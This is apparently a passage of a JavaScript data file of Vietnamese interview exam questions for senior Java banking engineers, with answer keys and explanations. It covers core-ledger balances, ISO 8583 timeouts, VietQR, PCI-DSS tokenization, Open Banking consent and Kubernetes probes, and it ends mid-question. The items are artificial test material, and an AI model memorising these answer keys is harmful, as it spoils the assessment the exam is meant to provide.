/* Bộ đề thi tuyển Senior Java Ngân Hàng — Vòng 3 (Nghiệp vụ Core Banking, Bảo mật PCI-DSS/HSM & K8s) & Vòng 4 (Full-Stack Ngân Hàng & System Design 10.000 TPS) */
window.EXAM_SETS = window.EXAM_SETS || [];

(function () {
  var r3CaseStudy = {
    "title": "Case Study: VietFinBank — Nâng cấp Payment Hub NAPAS 24/7, VietQR & Kiểm toán PCI-DSS 4.0",
    "context": "VietFinBank là ngân hàng thương mại cổ phần phục vụ 8,5 triệu khách hàng cá nhân và 120.000 doanh nghiệp, xử lý trung bình 3,5 triệu giao dịch chuyển tiền nhanh liên ngân hàng NAPAS 24/7 (IBFT) và thanh toán mã VietQR động mỗi ngày, cùng 1,2 triệu giao dịch thẻ quốc tế Visa/Mastercard. Đội ngũ Kiến trúc sư đang nâng cấp nền tảng Core Ledger và Payment Hub viết bằng Java 21 + Spring Boot 3.3 chạy trên cụm Red Hat OpenShift trải dài qua 2 Trung tâm dữ liệu (DC Hòa Lạc và DC Tân Thuận) với cam kết SLA 99,99%, RPO = 0 (không chấp nhận mất dù 1 giao dịch tài chính đã báo thành công) và RTO < 10 phút. Toàn bộ giao dịch chuyển tiền có thu phí phải tuân thủ nghiêm ngặt nguyên tắc Sổ cái Kế toán Kép bất biến (Double-Entry Immutable Ledger). Tháng tới, đoàn đánh giá QSA quốc tế sẽ kiểm toán chính thức chuẩn PCI-DSS 4.0 đối với hệ thống phát hành và thanh toán thẻ: nghiêm cấm tuyệt đối việc để lộ số thẻ đầy đủ (16 số PAN) hoặc dữ liệu xác thực nhạy cảm (CVV2, PIN Block) ra ngoài vùng mạng CDE, file log hay Kafka chung. Đồng thời, VietFinBank đang mở cổng Open Banking (BaaS) cho phép các phần mềm kế toán ERP của doanh nghiệp đối tác truy vấn số dư và sao kê tự động theo đúng ủy quyền (Consent) của từng tài khoản công ty, đòi hỏi tính chống chối bỏ pháp lý (Non-repudiation) và chống tấn công phát lại gói tin (Anti-Replay)."
  };

  var examR3 = {
    "id": "senior-round-3",
    "cert": "Vòng 3 · Nghiệp vụ & Bảo mật",
    "title": "Đề Thi Tuyển Số 3 — Core Banking Ledger, ISO 8583/20022, Đối soát, Bảo mật PCI-DSS/HSM & K8s",
    "subtitle": "25 câu hỏi tình huống thực chiến + Case Study NAPAS 24/7, VietQR & Kiểm toán PCI-DSS 4.0 · Phủ đều B1..B6, K1..K6, O1..O6",
    "durationMinutes": 50,
    "passingScore": 700,
    "questions": [
      {
        "id": "R3-01",
        "domain": "Core Banking & Sổ cái Kế toán Kép (B1)",
        "lessonId": "B1",
        "difficulty": "Trung bình",
        "caseStudy": r3CaseStudy,
        "question": "Khách hàng doanh nghiệp tại VietFinBank khởi tạo lệnh chuyển tiền nhanh liên ngân hàng 100.000.000 VNĐ, phí chuyển tiền 10.000 VNĐ và thuế GTGT (VAT 10% trên phí) là 1.000 VNĐ. Tài khoản thanh toán CASA của khách đang có Ledger Balance = 150.000.000 VNĐ nhưng đang có một khoản khoanh giữ bảo lãnh dự thầu (Hold) trị giá 49.995.000 VNĐ. Core Ledger của bạn phải kiểm tra điều kiện và sinh bút toán kế toán như thế nào?",
        "options": [
          "Kiểm tra Available Balance = 150.000.000 - 49.995.000 = 100.005.000 VNĐ < tổng cần trích 100.011.000 VNĐ nên từ chối giao dịch ngay với mã INSUFFICIENT_AVAILABLE_FUNDS; nếu đủ tiền thì phải sinh 1 Journal bất biến gồm các dòng Posting cân bằng: Nợ (Debit) CASA khách 100.011.000 = Có (Credit) GL Trung gian Thanh toán/Nostro 100.000.000 + Có GL Thu phí dịch vụ 10.000 + Có GL Thuế VAT phải nộp 1.000.",
          "Kiểm tra Ledger Balance = 150.000.000 VNĐ >= 100.011.000 VNĐ nên cho phép thực hiện giao dịch và chạy câu lệnh UPDATE accounts SET balance = balance - 100011000 trực tiếp để đạt tốc độ cao nhất.",
          "Chỉ trừ đúng 100.000.000 VNĐ ở thời điểm giao dịch cho vừa đủ Available Balance 100.005.000 VNĐ, còn 11.000 VNĐ tiền phí và thuế VAT thì ghi nợ âm tạm thời không cần kiểm tra số dư khả dụng.",
          "Tự động giải tỏa tạm thời khoản Hold 49.995.000 VNĐ để lấy tiền thực hiện lệnh chuyển khoản trước, cuối ngày chạy Batch Job thu hồi lại khoản Hold sau."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "Ledger Balance = 150.000.000 VNĐ ... khoanh giữ (Hold) 49.995.000 VNĐ ... chuyển 100.000.000 + phí 10.000 + VAT 1.000 ... Sổ cái Kế toán Kép bất biến",
          "whyCorrect": "Chào em, câu mở màn đánh thẳng vào trái tim của mọi hệ thống Core Banking! Em luôn phải phân biệt rạch ròi giữa `Ledger Balance` (số dư kế toán trên sổ) và `Available Balance = Ledger Balance - Hold Amount + Overdraft Limit`. Ở đây số dư khả dụng thực tế chỉ còn `150.000.000 - 49.995.000 = 100.005.000 VNĐ`, nhỏ hơn tổng nghĩa vụ trích nợ `100.011.000 VNĐ` (gốc + phí + VAT) đúng 6.000 VNĐ nên bắt buộc phải từ chối ngay! Và khi đủ số dư khả dụng, nguyên lý Kế toán Kép (Double-Entry) đòi hỏi 1 Journal phải có tổng Nợ bằng tổng Có tuyệt đối đến từng đồng, tách bạch rõ tài khoản trung gian thanh toán, tài khoản doanh thu phí và tài khoản thuế GTGT đầu ra để báo cáo tài chính ngân hàng luôn khớp 100%.",
          "whyWrong": [
            "",
            "Lấy `Ledger Balance` để cho rút tiền là lỗi nghiệp vụ chí mạng khiến khách hàng tiêu mất khoản tiền đang bị phong tỏa pháp lý/bảo lãnh; ngoài ra chạy `UPDATE balance` mà không sinh bản ghi Posting sổ cái bất biến sẽ làm hỏng hoàn toàn dấu vết kiểm toán.",
            "Tách phí để cho tài khoản thông thường bị thấu chi (âm số dư khả dụng) khi không có hạn mức thấu chi được cấp phép là vi phạm quy tắc kiểm soát rủi ro tín dụng của Core Banking.",
            "Khoản Hold (phong tỏa/bảo lãnh/khoanh giữ chờ thanh toán thẻ) có giá trị cam kết tài chính cứng, tuyệt đối không bao giờ được tự ý gỡ ra cho giao dịch khác mượn tạm."
          ],
          "tip": "Công thức bất di bất dịch trong Core Banking: Kiểm tra điều kiện rút/khoanh tiền luôn dựa trên `Available Balance` (tính đủ gốc + phí + VAT), và hạch toán luôn phải thỏa phương trình bất biến `SUM(Debit) == SUM(Credit)`!"
        }
      },
      {
        "id": "R3-02",
        "domain": "Chuẩn ISO 8583 & Chuyển mạch NAPAS (B2)",
        "lessonId": "B2",
        "difficulty": "Khó (Bẫy thực chiến)",
        "caseStudy": r3CaseStudy,
        "question": "Khi Payment Hub của VietFinBank khoanh giữ tiền khách hàng và gửi thông điệp tài chính ISO 8583 MTI 0200 sang cổng chuyển mạch liên ngân hàng, sau 30 giây kết nối gặp lỗi ReadTimeout (hoặc nhận phản hồi 0210 với trường DE39 = '68' - Response received too late). Là Senior Architect, bạn thiết kế luồng xử lý tự động tiếp theo như thế nào để đảm bảo tuyệt đối không mất tiền ngân hàng và không trừ oan tiền khách?",
        "options": [
          "Lập tức nhả khoản khoanh giữ (Release Hold) và trả thông báo 'Giao dịch thất bại, đã hoàn tiền' trên màn hình App ngay giây thứ 31 để khách hàng yên tâm bấm chuyển lại lệnh mới.",
          "Tự động retry gửi lại thông điệp MTI 0200 với một số STAN (DE11) và RRN (DE37) hoàn toàn mới tối đa 3 lần liên tiếp cho tới khi nhận được DE39 = '00'.",
          "Giữ khoản tiền ở trạng thái PENDING / hạch toán treo vào tài khoản trung gian (Suspense GL), thông báo khách hàng 'Giao dịch đang chờ kết quả từ ngân hàng thụ hưởng', kích hoạt luồng truy vấn trạng thái (Inquiry) hoặc phát điện Đảo giao dịch MTI 0420 (kèm đúng DE11 STAN, DE37 RRN, DE4, DE32 gốc) theo đúng quy định chuyển mạch; chỉ hoàn tiền hoặc tất toán dứt điểm khi có xác nhận trạng thái cuối hoặc sau phiên đối soát.",
          "Đánh dấu giao dịch thành công luôn (DE39 = '00' giả lập nội bộ) vì xác suất ngân hàng đích nhận được lệnh thường cao hơn 80%, nếu khách khiếu nại thì giải quyết bằng tay sau 15 ngày."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "MTI 0200 ... ReadTimeout hoặc DE39 = '68' ... không mất tiền ngân hàng và không trừ oan tiền khách",
          "whyCorrect": "Chào em, đây chính là 'câu hỏi triệu đô' phân loại ngay lập tức ứng viên đã từng làm thanh toán thật hay chưa! Trong thanh toán liên ngân hàng, `ReadTimeout` hoặc `DE39 = 68` mang nghĩa **Trạng thái Không xác định (Unknown/Doubtful)** — rất có thể ngân hàng đích ĐÃ cộng tiền cho người nhận xong xuôi, chỉ có gói tin trả lời về bị rớt mạng! Do đó, chuẩn mực vàng của ngành là: chuyển giao dịch sang trạng thái chờ xử lý (`PENDING`), treo vốn tại tài khoản `Suspense GL`, trả thông báo trung thực cho khách để khách không bấm chuyển đúp, sau đó chạy Worker tra vấn trạng thái giao dịch gốc hoặc phát điện Reversal `0420` (hoặc theo quy tắc IBFT NAPAS không tự hoàn ngay mà chờ tra soát/đối soát T+0/T+1) để chốt kết quả một cách chắc chắn 100%.",
          "whyWrong": [
            "Hoàn tiền mù ngay khi bị Timeout là thảm họa kinh điển nhất ngành Fintech: nếu phía ngân hàng nhận thực tế đã ghi Có thành công, khách hàng vừa được hoàn tiền lại vừa chuyển tiếp lần 2 -> ngân hàng mất đứt 100% số tiền!",
            "Bắn lại `0200` với `STAN (DE11)` và `RRN (DE37)` mới toanh sẽ bị cổng chuyển mạch hiểu là một giao dịch chuyển tiền hoàn toàn mới, dẫn tới ghi Có 2–3 lần vào tài khoản người nhận.",
            "",
            "Báo khống 'Thành công' khi giao dịch thực chất bị rớt trước khi sang tới ngân hàng bạn sẽ làm người bán không nhận được tiền và vi phạm nghiêm trọng quy định hạch toán trung thực của NHNN."
          ],
          "tip": "Gặp `ReadTimeout` / `HTTP 504` / `ISO 8583 DE39 = 68` trên luồng trích tiền -> Đèn đỏ nhấp nháy: `UNKNOWN STATE`! Tuyệt đối KHÔNG hoàn tiền ngay, KHÔNG bắn lệnh mới đổi mã tham chiếu; phải treo `Suspense` + Inquiry/Reversal `0420` + Đối soát!"
        }
      },
      {
        "id": "R3-03",
        "domain": "NAPAS 24/7, VietQR & Cổng Thanh Toán (B3)",
        "lessonId": "B3",
        "difficulty": "Trung bình",
        "caseStudy": r3CaseStudy,
        "question": "VietFinBank cung cấp API sinh mã VietQR động gắn từng hóa đơn cho các chuỗi siêu thị đối tác và gửi Payment Webhook báo gạch nợ tức thời ngay khi người mua quét mã chuyển khoản thành công. Thiết kế kỹ thuật nào sau đây tuân thủ đúng chuẩn EMVCo VietQR của NAPAS và bảo vệ đối tác khỏi gian lận giả mạo thanh toán?",
        "options": [
          "Đóng gói chuỗi QR theo cấu trúc TLV (Tag-Length-Value) chuẩn EMVCo (chứa BIN ngân hàng, số tài khoản/VA đích, số tiền Tag 54, mã đơn hàng Tag 62), nối thêm '6304' ở cuối để tính mã kiểm tra 4 ký tự Hex theo thuật toán CRC-16/CCITT-FALSE; đồng thời phía nhận Webhook bắt buộc xác thực chữ ký số bất đối xứng (JWS/HMAC), kiểm tra chống trùng txnId, đối khớp đúng mã đơn hàng VÀ số tiền thực nhận >= giá trị hóa đơn trước khi gạch nợ.",
          "Mã hóa JSON chứa số tài khoản và số tiền thành chuỗi Base64 để in lên mã QR cho nhanh, còn phía siêu thị chỉ cần kiểm tra HTTP Status 200 của request gửi tới endpoint Webhook và khớp orderId là cho xuất hàng ngay.",
          "Dùng thuật toán băm MD5 cắt 4 ký tự đầu gắn vào Tag 63 của chuỗi VietQR, và trên ứng dụng Mobile của thu ngân cho phép truyền thẳng số tiền cần gạch nợ từ trình duyệt xuống API gạch nợ không cần chờ Backend xác nhận.",
          "Tạo duy nhất 1 mã QR tĩnh dán cố định tại quầy không gắn mã đơn hàng hay số tiền, sau đó viết Regex đọc nội dung chuyển khoản tự do của khách và bỏ qua kiểm tra chữ ký Webhook để giảm độ trễ xuống dưới 10ms."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "VietQR động gắn từng hóa đơn ... Payment Webhook báo gạch nợ tức thời ... chuẩn EMVCo VietQR của NAPAS và chống gian lận",
          "whyCorrect": "Chuẩn xác từng chi tiết kỹ thuật luôn em! Một chuỗi VietQR động hợp lệ được mọi App Ngân hàng tại Việt Nam quét nhận diện tự động bắt buộc tuân theo định dạng EMVCo Merchant-Presented QR dạng TLV (`Tag` 2 ký tự + `Length` 2 ký tự + `Value`), trong đó cuối chuỗi nối sẵn `'6304'` (Tag 63 là CRC, độ dài 04 ký tự) rồi chạy thuật toán **CRC-16/CCITT-FALSE** (polynomial `0x1021`, init `0xFFFF`) xuất ra 4 ký tự Hex in hoa. Đặc biệt ở chiều Webhook báo kết quả: kẻ gian rất hay bắn gói tin giả vào URL Webhook hoặc sửa số tiền QR động xuống 1.000đ cho đơn hàng 20 triệu đồng — nên kiểm tra đồng thời **Chữ ký số + Chống trùng `txnId` + Đúng `orderId` + Đúng `amount` thực nhận** là lá chắn bắt buộc!",
          "whyWrong": [
            "",
            "Chuỗi Base64 JSON tùy biến không tuân chuẩn EMVCo nên tất cả ứng dụng ngân hàng khác (Vietcombank, MB, Techcombank...) đều báo 'Mã QR không hợp lệ'; ngoài ra Webhook không kiểm tra chữ ký và số tiền thực nhận sẽ bị hacker gọi `curl` giả mạo gạch nợ đơn hàng 0 đồng ngay lập tức.",
            "Tag 63 của EMVCo bắt buộc dùng CRC-16/CCITT-FALSE chứ không phải MD5; nếu sai 1 ký tự CRC là App ngân hàng từ chối quét ngay từ đầu.",
            "Dùng QR tĩnh không có mã định danh đơn hàng / Virtual Account (VA) động ở chuỗi siêu thị đông người khiến hàng loạt giao dịch trùng số tiền không biết của hóa đơn nào, còn bỏ chữ ký Webhook là tự mở cửa kho cho tin tặc."
          ],
          "tip": "Nhớ cặp bài trùng VietQR Production: Sinh mã phải nối `'6304'` trước khi tính `CRC-16/CCITT-FALSE` (hoặc cấp tài khoản định danh VA động cho từng đơn), nhận Webhook phải check đủ 4 chốt: `Signature` + `Idempotency` + `OrderId` + `ActualAmount`!"
        }
      },
      {
        "id": "R3-04",
        "domain": "Chuẩn Bảo mật Thẻ PCI-DSS 4.0 & CDE (K4)",
        "lessonId": "K4",
        "difficulty": "Trung bình",
        "caseStudy": r3CaseStudy,
        "question": "Trong quá trình rà soát kiến trúc chuẩn bị đón đoàn kiểm toán QSA cho chứng chỉ PCI-DSS 4.0 tại VietFinBank, bạn phát hiện 18 microservices ngoài vùng CDE (như Loyalty, Notification, Analytics, CRM) vẫn đang nhận sự kiện Kafka chứa đầy đủ số thẻ 16 số (PAN) và có một bảng tạm lưu mã CVV2 mã hóa AES-256 để phục vụ thanh toán định kỳ. Bạn phải tái cấu trúc như thế nào để vượt qua kỳ kiểm toán?",
        "options": [
          "Giữ nguyên kiến trúc hiện tại nhưng cài đặt thêm phần mềm diệt virus và tường lửa lên cả 18 microservices để đưa toàn bộ ngân hàng vào chung vùng kiểm toán CDE.",
          "Xóa ngay lập tức và cấm tuyệt đối lưu trữ dữ liệu xác thực nhạy cảm SAD (CVV2/CVC2, PIN Block, Track Data) dưới mọi hình thức (kể cả đã mã hóa) sau khi cấp phép giao dịch; đồng thời cô lập dịch vụ Card Vault trong vùng mạng CDE biệt lập để thực hiện Payment Tokenization, chỉ phát hành Card Token vô nghĩa kèm PAN đã che mờ (tối đa 6 số đầu - 4 số cuối, VD: 411111******1234) ra Kafka và các microservice bên ngoài.",
          "Chỉ cần đổi thuật toán băm số thẻ PAN bằng SHA-1 không có salt gửi qua Kafka và tiếp tục lưu mã CVV2 trong Redis có đặt TTL 30 ngày cho tính năng gia hạn tự động.",
          "Che mờ 4 số cuối của thẻ (giữ nguyên 12 số đầu dạng rõ) trong file log, còn trong cơ sở dữ liệu của dịch vụ CRM và Loyalty thì vẫn lưu số PAN 16 số dạng rõ để nhân viên tổng đài dễ tra cứu."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "18 microservices ngoài vùng CDE ... nhận sự kiện Kafka chứa đầy đủ số thẻ 16 số (PAN) và có bảng tạm lưu mã CVV2 mã hóa AES-256 ... PCI-DSS 4.0",
          "whyCorrect": "Đọc đề câu này mà nắm vững PCI-DSS 4.0 là em bắt bệnh trúng phóc ngay trong 5 giây! Có 2 điều luật sắt của PCI-DSS (Requirement 3): Thứ nhất, **Sensitive Authentication Data (SAD)** gồm `CVV2/CVC2`, `PIN/PIN Block`, `Full Track Data` bị **CẤM TUYỆT ĐỐI** lưu trữ sau bước cấp phép (post-authorization) dù có mã hóa mạnh bằng AES-256 hay HSM đi chăng nữa! (Thanh toán định kỳ dùng cơ chế Network/Acquirer Token + cờ MIT chứ không lưu CVV2). Thứ hai, để thu hẹp phạm vi kiểm toán (Scope Reduction), ta nhốt toàn bộ PAN thật vào dịch vụ **Card Vault** nằm gọn trong vùng mạng **CDE** cô lập, trả về `Card Token` kèm chuỗi hiển thị che mờ chuẩn **tối đa 6 số BIN đầu và 4 số cuối** cho toàn bộ 18 microservices còn lại.",
          "whyWrong": [
            "Để PAN lan sang 18 microservices sẽ biến toàn bộ hạ tầng ngân hàng thành vùng CDE, làm chi phí tuân thủ, kiểm toán, phần cứng bảo mật tăng gấp hàng chục lần và vẫn trượt ngay lập tức vì lỗi lưu CVV2!",
            "",
            "Lưu CVV2 trong Redis 30 ngày vẫn vi phạm trực tiếp lệnh cấm lưu SAD sau cấp phép; ngoài ra băm SHA-1 số thẻ 16 số không có khóa bí mật cực kỳ dễ bị dò vét cạn (brute-force chỉ có vài tỷ tổ hợp hợp lệ theo thuật toán Luhn) trong vài phút bằng GPU.",
            "Quy tắc hiển thị PAN của PCI-DSS chỉ cho phép tối đa 6 số đầu (BIN) và 4 số cuối; để lộ 12 số đầu hoặc lưu PAN rõ ở CRM ngoài CDE là lỗi rớt kiểm toán hạng nặng."
          ],
          "tip": "Khắc cốt ghi tâm luật PCI-DSS 4.0: `CVV2 / PIN Block` -> CẤM lưu sau cấp phép kể cả đã mã hóa! `PAN` -> Giấu trong Card Vault vùng CDE, bên ngoài chỉ được cầm `Card Token` + `Masked PAN (6 đầu ****** 4 cuối)`!"
        }
      },
      {
        "id": "R3-05",
        "domain": "Giao tiếp Liên Ngân hàng: mTLS, JWS & Anti-Replay (K2)",
        "lessonId": "K2",
        "difficulty": "Khó (Bẫy đề thi)",
        "caseStudy": r3CaseStudy,
        "question": "Trên cổng Open Banking kết nối giữa hệ thống ERP của tập đoàn đối tác với VietFinBank, đội hạ tầng đã cấu hình kênh truyền mTLS hai chiều (Mutual TLS kiểm tra cả Client Certificate và Server Certificate) tại tầng API Gateway. Một kỹ sư đề xuất bỏ bước ký số Payload (JWS) và bỏ kiểm tra Nonce/Timestamp để giảm công sức tích hợp. Bạn đánh giá và thiết kế cơ chế bảo mật nào mới đáp ứng yêu cầu pháp lý của ngân hàng?",
        "options": [
          "Đồng ý với đề xuất: vì mTLS 2 chiều đã mã hóa đường truyền và xác thực danh tính máy chủ đối tác nên không thể xảy ra tranh chấp pháp lý hay tấn công phát lại gói tin.",
          "Bỏ mTLS 2 chiều đi cho nhẹ tải CPU, chỉ cần gắn thêm một chuỗi mật khẩu tĩnh X-Partner-Secret vào HTTP Header của mỗi bản tin JSON.",
          "Giữ nguyên mTLS 2 chiều ở tầng giao vận VÀ bắt buộc đối tác ký số trên từng Payload nghiệp vụ bằng khóa riêng bất đối xứng (JWS dùng RSA-PSS hoặc ECDSA lưu trữ chứng thư đối chiếu) để đảm bảo tính chống chối bỏ pháp lý (Non-repudiation) xuyên qua các Proxy trung gian, kết hợp kiểm tra cửa sổ X-Timestamp (VD lệch không quá ±180 giây) và lưu vết X-Nonce nguyên tử bằng Redis SETNX có TTL nhằm chặn đứng tấn công Replay.",
          "Chỉ cần yêu cầu đối tác nối thêm thời gian hiện tại vào cuối body JSON mà không cần lưu vết Nonce trên Redis hay ký số bất đối xứng."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "đã cấu hình mTLS hai chiều ... bỏ bước ký số Payload (JWS) và bỏ kiểm tra Nonce/Timestamp ... đòi hỏi tính chống chối bỏ pháp lý (Non-repudiation) và chống tấn công phát lại (Anti-Replay)",
          "whyCorrect": "Câu trả lời thể hiện rõ đẳng cấp Security Architect ngân hàng! Em cần giải thích rõ cho đội ngũ: **mTLS chỉ bảo vệ đường ống kết nối điểm-tới-điểm (Transport Layer)** từ máy chủ đối tác tới con Load Balancer / API Gateway ngoài biên — sau khi TLS được giải mã (TLS Termination) tại Gateway, bản tin đi vào nội bộ không còn chữ ký gốc của đối tác nữa! Nếu 6 tháng sau xảy ra tranh chấp kiện tụng 'Đối tác bảo không hề ra lệnh chi 5 tỷ này, do quản trị viên ngân hàng tự sửa JSON', một mình mTLS không thể làm bằng chứng tòa án. Bắt buộc phải có **Chữ ký số Payload (JWS bằng RSA-PSS/ECDSA)** lưu kèm bản tin gốc để chứng minh tính **Chống chối bỏ (Non-repudiation)**, cộng với cặp đôi **`Timestamp Window` (±3 phút) + `Redis SETNX Nonce`** để không ai bắt lại gói tin đã ký hợp lệ bắn lặp lần 2!",
          "whyWrong": [
            "Nhầm lẫn tai hại giữa bảo mật kênh truyền (mTLS) và chữ ký mức thông điệp: mTLS chấm dứt tại Reverse Proxy nên không chứng minh được toàn vẹn nội dung nghiệp vụ về sau, cũng không ngăn được phần mềm độc hại phía proxy đối tác phát lại đúng bản tin HTTPS vừa gửi.",
            "Xóa bỏ mTLS và thay bằng mật khẩu tĩnh (Shared Secret) vừa tụt hậu nghiêm trọng về bảo mật, vừa làm mất hoàn toàn tính chống chối bỏ (vì cả hai bên đều biết chung secret đó).",
            "",
            "Chỉ kiểm tra `Timestamp` mà không kiểm tra `Nonce` duy nhất bằng `SETNX` thì trong khoảng cửa sổ 3 phút hợp lệ đó, kẻ tấn công có thể phát lại (replay) gói tin hàng nghìn lần liên tiếp!"
          ],
          "tip": "Combo chuẩn vàng kết nối Liên Ngân hàng / Open Banking: `mTLS 2 chiều` (bảo vệ kênh truyền) + `JWS Payload Signature RSA-PSS/ECDSA` (chống chối bỏ pháp lý) + `Timestamp Window + Redis SETNX Nonce` (chống Replay)!"
        }
      },
      {
        "id": "R3-06",
        "domain": "Open Banking, BaaS & Quản trị Consent (B6)",
        "lessonId": "B6",
        "difficulty": "Trung bình",
        "caseStudy": r3CaseStudy,
        "question": "Công ty Cổ phần Minh Phát có 3 tài khoản tại VietFinBank (TK-01 chuyên thu bán lẻ, TK-02 trả lương mật cho Ban Giám đốc, TK-03 dự trữ đầu tư). Giám đốc Minh Phát chỉ cấp quyền ủy quyền (Consent) trên cổng Open Banking cho phần mềm ERP 'FastAcc' được phép ĐỌC SỐ DƯ và SAO KÊ của riêng tài khoản TK-01 trong thời hạn 90 ngày. Khi 'FastAcc' gửi request kèm OAuth2 Access Token hợp lệ (scope chung `accounts.read`) đòi xem sao kê của TK-02, Middleware bảo mật của VietFinBank phải xử lý thế nào?",
        "options": [
          "Cho phép trả về sao kê của TK-02 vì Access Token có chữ ký số hợp lệ, chưa hết hạn và cả TK-01 lẫn TK-02 đều thuộc cùng mã khách hàng doanh nghiệp (CIF) của Công ty Minh Phát.",
          "Trả về HTTP 200 OK với danh sách giao dịch rỗng `[]` để giấu lỗi khiến phần mềm ERP tưởng rằng TK-02 có tồn tại hợp lệ nhưng tháng này không phát sinh giao dịch.",
          "Tự động mở rộng phạm vi Consent thêm TK-02 rồi gửi email thông báo sau cho Giám đốc Minh Phát để không làm gián đoạn luồng đồng bộ kế toán của đối tác.",
          "Truy vấn bản ghi Consent gắn với `consent_id` trong Token/Header để đối chiếu đồng thời 4 ràng buộc: đúng `client_id` ('FastAcc'), trạng thái Consent còn `ACTIVE` (chưa bị thu hồi và trong hạn 90 ngày), đúng hành vi được cấp (`STATEMENT_READ`), VÀ danh sách tài khoản được ủy quyền có chứa `TK-02`; do `TK-02` không nằm trong phạm vi Consent nên chặn ngay với mã HTTP 403 Forbidden (`CONSENT_ACCOUNT_UNAUTHORIZED`)."
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "chỉ cấp Consent cho phần mềm ERP 'FastAcc' được đọc của riêng tài khoản TK-01 trong 90 ngày ... đòi xem sao kê của TK-02",
          "whyCorrect": "Trong thế giới Open Banking (chuẩn UK Open Banking / FAPI / Thông tư Open API của NHNN), **Xác thực Token hợp lệ mới chỉ đi được nửa chặng đường**! Điểm khác biệt cốt lõi nhất của Open Banking là **Fine-grained Consent Management (Quản trị sự đồng thuận hạt mịn)**: khách hàng không trao chìa khóa cả két sắt CIF cho đối tác thứ ba, mà chỉ ủy quyền cụ thể đối tác `client_id` nào, được làm hành động `permission` gì, trên đúng những `account_no` nào, trong khoảng thời gian từ ngày nào đến ngày nào và có thể bấm Thu hồi (Revoke) bất cứ giây nào trên Mobile App. Do `TK-02` (tài khoản lương mật Ban Giám đốc) không nằm trong danh sách tài khoản của `consent_id`, Middleware bắt buộc từ chối thẳng bằng `403 Forbidden` và ghi Security Audit Log!",
          "whyWrong": [
            "Chỉ kiểm tra `CIF` chung mà bỏ qua danh sách tài khoản cụ thể trong `Consent` chính là lỗ hổng Broken Object Level Authorization trong Open Banking, làm lộ toàn bộ bảng lương mật của Ban Giám đốc cho bên thứ ba.",
            "Trả về mảng rỗng `[]` kèm HTTP 200 sẽ khiến phần mềm kế toán ERP ghi nhận sai lệch rằng tài khoản TK-02 có số phát sinh bằng 0, gây sai báo cáo tài chính doanh nghiệp.",
            "Tự ý nâng quyền truy cập tài khoản ngân hàng khi chưa có xác thực đa nhân tố (SCA) của chủ tài khoản là vi phạm pháp luật nghiêm trọng về bảo mật thông tin khách hàng.",
            ""
          ],
          "tip": "Làm Open Banking / BaaS luôn nhớ công thức kiểm chứng 4 chiều của Consent: `Who (clientId)` + `What (permission/scope)` + `Which Resource (exact accountNo)` + `When (ACTIVE & not expired/revoked)`!"
        }
      },
      {
        "id": "R3-07",
        "domain": "Kubernetes / OpenShift Zero-Downtime & Probes (O2)",
        "lessonId": "O2",
        "difficulty": "Khó (Bẫy thực chiến)",
        "caseStudy": r3CaseStudy,
        "question": "Trên cụm Red Hat OpenShift của VietFinBank, đội vận hành phàn nàn hai hiện tượng: (1) Hễ đường truyền sang cổng đối tác NAPAS bị chập chờn 15 giây là toàn bộ 24 Pod của Payment Hub tự động bị OpenShift khởi động lại đồng loạt gây sập cả các luồng chuyển tiền nội bộ; (2) Khi rollout phiên bản mới giữa ngày vẫn bị rớt khoảng 0,2% request đang chạy dở. Tổ hợp cấu hình nào khắc phục triệt để cả hai sự cố?",
        "options": [
          "Tách riêng `livenessProbe` chỉ kiểm tra sức khỏe nội tại của JVM (`/actuator/health/liveness`, tuyệt đối KHÔNG nhét health indicator kiểm tra kết nối NAPAS/DB vào liveness), dùng `readinessProbe` kiểm tra khả năng sẵn sàng nhận tải; đồng thời bật `server.shutdown=graceful`, đặt `spring.lifecycle.timeout-per-shutdown-phase=35s`, thêm `lifecycle.preStop` (`sleep 5` để chờ EndpointSlice/Router ngừng đẩy request mới) và nâng `terminationGracePeriodSeconds: 45` cùng `PodDisruptionBudget`.",
          "Tăng `failureThreshold` của `livenessProbe` lên 1000 lần và đặt `terminationGracePeriodSeconds: 1` để Pod cũ tắt thật nhanh nhường chỗ cho Pod mới.",
          "Gộp chung `livenessProbe` và `readinessProbe` cùng trỏ vào một API ping thẳng sang máy chủ NAPAS mỗi 2 giây để phát hiện lỗi mạng nhanh nhất.",
          "Chuyển chiến lược triển khai từ `RollingUpdate` sang `Recreate` để tắt sạch 24 Pod cũ cùng lúc rồi mới bật 24 Pod mới, đảm bảo không có hai phiên bản chạy song song."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "đường truyền sang đối tác NAPAS chập chờn 15 giây là toàn bộ 24 Pod tự động bị khởi động lại đồng loạt ... rollout phiên bản mới bị rớt 0,2% request đang chạy dở",
          "whyCorrect": "Một tình huống 'đau thương' mà hầu như ngân hàng nào lên K8s/OpenShift thời kỳ đầu cũng từng vấp phải! Nguyên nhân hiện tượng (1) là nhét `NapasHealthIndicator` hoặc `DataSourceHealthIndicator` vào **`livenessProbe`**: khi đối tác lag, cả 24 Pod cùng trả HTTP 503 cho liveness -> Kubelet tưởng cả 24 JVM bị treo chết nên giết sạch (Restart Storm), biến lỗi cục bộ của 1 đối tác thành sập toàn bộ ngân hàng! `livenessProbe` chỉ được kiểm tra bản thân tiến trình JVM còn sống hay bế tắc không. Còn hiện tượng (2) xảy ra do khi Pod nhận `SIGTERM`, thông tin gỡ IP của Pod truyền tới Ingress/Service Router mất vài giây trễ (race condition) — do đó chuẩn Zero-Downtime bắt buộc có **`preStop: sleep 5`** (để Router cắt hẳn tải mới tới Pod) + **`server.shutdown=graceful`** (ngừng nhận mới, chờ các giao dịch tài chính đang chạy hoàn tất trong 35s) + **`terminationGracePeriodSeconds` lớn hơn tổng hai khoảng chờ trên**!",
          "whyWrong": [
            "",
            "Đặt `terminationGracePeriodSeconds: 1` sẽ khiến K8s bắn `SIGKILL` cắt đứt ngang xương mọi giao dịch chuyển tiền đang xử lý dở ở mili-giây thứ 1001, gây treo giao dịch hàng loạt!",
            "Trỏ `livenessProbe` ping sang máy chủ đối tác mỗi 2 giây chính là thủ phạm gây bão khởi động lại (Cascading Restart Storm) và còn biến cụm Pod của ngân hàng thành nguồn bắn DDoS sang đối tác.",
